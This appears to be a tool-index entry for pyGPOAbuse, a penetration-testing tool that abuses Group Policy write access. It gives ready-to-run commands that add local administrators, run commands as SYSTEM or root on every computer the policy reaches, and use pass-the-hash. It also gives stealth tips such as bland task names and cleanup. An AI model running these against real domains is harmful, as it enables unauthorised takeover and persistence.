---
name: "pygpoabuse"
categories:
  - blackarch-windows
version: "51.c18e1de"
homepage: "https://github.com/Hackndo/pyGPOAbuse"
packaged-by: [blackarch, nixpkgs]
blackarch-builddate: "2026-06-13"
build-system: windows
license: MIT
meta-checked: "2026-11-09"
github-repo: "Hackndo/pyGPOAbuse"
github-stars: 608
github-pushed: "2026-06-13"
github-archived: false
github-issues: 6
github-match: "exact"
gh-checked: "2026-11-07"
worth: 6.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 17
gh-activity-checked: "2026-11-09"
---

# pygpoabuse

> Converts write access on a Group Policy Object into immediate code execution by injecting an immediate scheduled task.

## What it's for

pyGPOAbuse (by Hackndo, a partial Python implementation of SharpGPOAbuse) exploits the situation where an account you control can modify an existing GPO that applies to one or more users or computers. It edits the GPO's scheduled-task configuration to add an immediate scheduled task — running as SYSTEM on affected computers for a computer GPO, or as the logged-in user for a user GPO. With no -command supplied, the default behavior adds a new local administrator. Because a domain-linked GPO applies to every object in its scope, the SharpGPOAbuse-style filter options (-filter-enabled with -target-dns-name, -target-username or -target-user-sid) restrict the injected task to a single host or user instead of every machine. It also works against Samba AD domains, where --linux-exec stages a script or ELF as an immediate job running as root, and --cleanup removes the injected task again.

## Typical use cases

### Add a local administrator through an abusable GPO

Default behavior, no command needed.

```
python3 pygpoabuse.py example.com/svc_gpo:'Password1!' -gpo-id 12345677-ABCD-9876-ABCD-123456789012 -dc-ip 198.51.100.10
```

Outcome: authenticates to the domain controller, injects an immediate scheduled task into the named GPO, and the task creates a new local administrator on the computers the GPO applies to at their next policy refresh.

### Run an arbitrary command on affected hosts

The most common pattern — bring your own command.

```
python3 pygpoabuse.py example.com/user:'Password1!' -gpo-id 12345677-ABCD-9876-ABCD-123456789012 -command "powershell -exec bypass -c whoami" -taskname SecurityUpdate
```

Outcome: the injected immediate task runs the given command as SYSTEM on every computer in the GPO's scope; choose a bland -taskname so the entry blends into Task Scheduler.

### Restrict execution to a single host or user

Avoid touching every machine a domain-wide GPO reaches.

```
python3 pygpoabuse.py example.com/user:'Password1!' -gpo-id 12345677-ABCD-9876-ABCD-123456789012 -command "net user svc_bkp 'Passw0rd!' /add" -filter-enabled -target-dns-name dc01.example.com
```

Outcome: adds item-level targeting so only the named computer processes the task; swap in -target-username EXAMPLE\\user (optionally -target-user-sid) to scope it to one user instead.

### Abuse GPO write access with only a hash

Pass-the-hash instead of a plaintext password.

```
python3 pygpoabuse.py example.com/user -hashes aad3b435b51404eeaad3b435b51404ee:<NTHASH> -gpo-id 12345677-ABCD-9876-ABCD-123456789012
```

Outcome: authenticates to the DC with the supplied LMHASH:NTHASH pair and performs the same scheduled-task injection as the password form.

### Execute on a Samba AD domain

Target Linux domain members instead of Windows hosts.

```
python3 pygpoabuse.py example.com/user:'Password1!' -gpo-id 12345677-ABCD-9876-ABCD-123456789012 --linux-exec /tmp/job.sh
```

Outcome: stages the supplied script or ELF as an immediate job running as root on the Samba hosts the GPO reaches, rather than a Windows scheduled task.

### Remove the injected task after execution

Clean up the modification once the task has fired.

```
python3 pygpoabuse.py example.com/user:'Password1!' -gpo-id 12345677-ABCD-9876-ABCD-123456789012 --cleanup
```

Outcome: deletes the previously created scheduled task from the GPO, removing the visible configuration change while its effects persist.

*Corpus evidence: genuine usage in the corpus index (abusing GenericAll write on GPOs — a positional domain/user:password invocation running a `-command` powershell one-liner); every example and flag verified against the upstream README.*
